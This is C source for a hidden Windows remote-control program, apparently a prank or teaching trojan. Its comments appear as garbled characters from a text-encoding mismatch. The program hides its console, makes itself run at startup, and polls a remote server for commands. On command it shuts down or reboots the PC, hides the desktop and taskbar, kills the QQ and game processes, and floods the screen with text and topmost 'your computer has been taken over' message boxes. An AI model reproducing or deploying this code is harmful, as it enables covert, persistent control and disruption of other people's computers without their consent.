#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "itmojun.h"


//��ǰ��������winmm.lib������ļ�����Ϊ��������Ҫ�����������mciSendString����
#pragma comment(lib, "winmm.lib")
//��ǰ��������itmojun.lib������ļ�����Ϊ��������Ҫ�����������AutoRun������GetPCCmd����
#pragma comment(lib, "itmojun.lib")

//������ϵͳΪwindows��������Ӧ�ó��򣬲�����ʽָ����������Ϊmain��������Ϊ����Ӧ�ó����Ĭ�����ΪWinMain����
//����Ԥ����������������õ�ǰ����������ʱ����ʾ����̨���ڣ���������
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")


volatile int  bBeep = 0;  //�����������Ƿ񱨾��ı�־��0��ʾ�����������ʾ����
volatile int  bShowText = 0;  //�����Ƿ���ʾ��Ļ�ı�־��0��ʾ����ʾ�������ʾ��ʾ
volatile int  bMessageBox = 0;  //�����Ƿ���ʾ��Ϣ��0��ʾ����ʾ�������ʾ��ʾ
//ָ����ǰ���Ե�ID
//����뵥�����Ʋ�ͬ�ĵ��ԣ�����Щ�����ϵĳ���Ӧ��ʹ�ò�ͬ��PcId
//�����ͬʱ���ƶ�̨���ԣ�����Щ�����ϵĳ���Ӧ��ʹ����ͬ��PcId
const char* szPcId = "itmojun";

DWORD WINAPI BeepThr(LPVOID lpParam);
DWORD WINAPI ShowTextThr(LPVOID lpParam);
DWORD WINAPI MessageBoxThr(LPVOID lpParam);


int main()
{
	HANDLE hMutex;
	char szCmd[301];  //���Զ�̿���ָ��
	HANDLE hBeepThr = NULL;
	HANDLE hShowTextThr = NULL;
	HANDLE hMessageBoxThr = NULL;

	//ֻ����ʵ������
	hMutex = CreateMutex(NULL, TRUE, "dj_201903061509");
	
	if(NULL != hMutex)
	{
		if(ERROR_ALREADY_EXISTS == GetLastError())
		{
			return 0;
		}
	}

	//���ÿ���̨���ڱ���
	//system("title Զ�̿��������� - ITħ��");

	AutoRun();  //����ǰ��������Ϊ�����Զ�����

	//����һ���̣߳��ɸ��̸߳�����Ʊ����;���
	hBeepThr = CreateThread(NULL, 0, BeepThr, NULL, 0, NULL);
	CloseHandle(hBeepThr);

	//����һ���̣߳��ɸ��̸߳��������Ļ��ʾ������
	hShowTextThr = CreateThread(NULL, 0, ShowTextThr, NULL, 0, NULL);
	CloseHandle(hShowTextThr);

	//����һ���̣߳��ɸ��̸߳�������Ƿ񵯳���Ϣ��
	hMessageBoxThr = CreateThread(NULL, 0, MessageBoxThr, NULL, 0, NULL);
	CloseHandle(hMessageBoxThr);

	while(1)
	{
		//���ƶ˷���������һ�����͸���ǰ���ԵĿ���ָ��ַ�����Ϣ������ŵ�szCmd������
		//�����ǰ�����޷��������������ƶ˷�������û���κο���ָ�GetPCCmd��������һֱ�����ȴ�
		GetPCCmd(szPcId, szCmd);

		printf("\n���յ�Զ�̿���ָ�%s\n", szCmd);

		if(strstr(szCmd, "�ػ�"))
		{
			//�ػ�
			WinExec("shutdown -s -t 0", 0);
		}	
		else if(strstr(szCmd, "����"))
		{
			//����
			WinExec("shutdown -r -t 0", 0);
		}
		else if(strstr(szCmd, "�ɵ�����"))
		{
			//�����������(explorer.exe)
			//WinExec("cmd /C taskkill /f /im explorer.exe", 0);

			HWND desktop, taskbar;
			desktop = FindWindow("ProgMan", NULL);  //�������洰�ڻ���䴰�ھ�� 
			taskbar = FindWindow("Shell_TrayWnd", NULL);  //�������������ڻ���䴰�ھ��
			ShowWindow(desktop, SW_HIDE);  //��������
			ShowWindow(taskbar, SW_HIDE);  //����������
		}
		else if(strstr(szCmd, "�ָ�����"))
		{
			//�����������(explorer.exe)
			//WinExec("explorer", 1);  //Win10ϵͳ��������

			HWND desktop, taskbar;
			desktop = FindWindow("ProgMan", NULL);  //�������洰�ڻ���䴰�ھ�� 
			taskbar = FindWindow("Shell_TrayWnd", NULL);  //�������������ڻ���䴰�ھ��
			ShowWindow(desktop, SW_SHOW);  //��ʾ����
			ShowWindow(taskbar, SW_SHOW);  //��ʾ������
		}
		else if(strstr(szCmd, "ɱ���"))
		{
			//ǿ�ƽ���QQ����
			WinExec("cmd /C taskkill /f /im qq.exe", 0);
		}
		else if(strstr(szCmd, "����"))
		{
			//ǿ�ƽ���Ӣ�����˽���
			WinExec("cmd /C taskkill /f /im client.exe", 0);
		}
		else if(strstr(szCmd, "��վ"))
		{
			//����վ
			WinExec("explorer https://itmojun.com", 1);
		}
		else if(strstr(szCmd, "����"))
		{
			//���ű�������
			mciSendString("play bg.mp3", NULL, 0, NULL);
		}	
		else if(strstr(szCmd, "��ͣ"))
		{
			//��ͣ��������
			mciSendString("pause bg.mp3", NULL, 0, NULL);
		}	
		else if(strstr(szCmd, "ֹͣ"))
		{
			//ֹͣ��������
			mciSendString("stop bg.mp3", NULL, 0, NULL);
		}		
		else if(strstr(szCmd, "����"))
		{
			//����
			bBeep = 1;
		}	
		else if(strstr(szCmd, "��"))
		{
			//����
			bBeep = 0;
		}
		else if(strstr(szCmd, "��ʾ��Ļ"))
		{
			bShowText = 1;
		}
		else if(strstr(szCmd, "������Ļ"))
		{
			bShowText = 0;
		}
		else if(strstr(szCmd, "������Ϣ��"))
		{
			//������Ϣ��
			bMessageBox = 1;
		}
		else if(strstr(szCmd, "�ر���Ϣ��"))
		{
			//�ر���Ϣ��
			bMessageBox = 0;
		}
        
        Sleep(3000);  //PC����ָ�����ƶ˷������ᱣ��3�룬���ڼ�����ظ���ȡ����������3����Ϊ���ó��򲻻��ͬһ������ָ���ظ���ȡ���
	}

	return 0;
}


DWORD WINAPI BeepThr(LPVOID lpParam)
{
	while(1)
	{
		if(bBeep)
		{
			Beep(1000, 500);
		}
		else
		{
			Sleep(500);
		}
	}

	return 0;
}


DWORD WINAPI ShowTextThr(LPVOID lpParam)
{
	HFONT hFont = CreateFont(100,50,0,0,FW_BOLD,0,0,0,ANSI_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH|FF_SWISS,"����");						
	HFONT hOldFont;
	HDC hdc;
	const char *pszText = "���絽��һ�Σ�";

	while(1)
	{
		if(bShowText)
		{
			hdc = GetDC(NULL);
			
			SetBkMode(hdc,TRANSPARENT);
			SetTextColor(hdc,RGB(255,0,0));						
			
			hOldFont=(HFONT)SelectObject(hdc,hFont);
									
			TextOut(hdc,10,20,pszText,strlen(pszText));
			
			SelectObject(hdc,hOldFont);
			ReleaseDC(NULL,hdc);			
		}

		Sleep(100);
	}

	return 0;
}


DWORD WINAPI MessageBoxThr(LPVOID lpParam)
{
	while(1)
	{
		if(bMessageBox)
			MessageBox(NULL, "��������ĵ����ѱ�����ӹܣ�", "ɧ����ʾ", MB_OK | MB_ICONWARNING | MB_TOPMOST);
		else
			Sleep(500);
	}

	return 0;
}
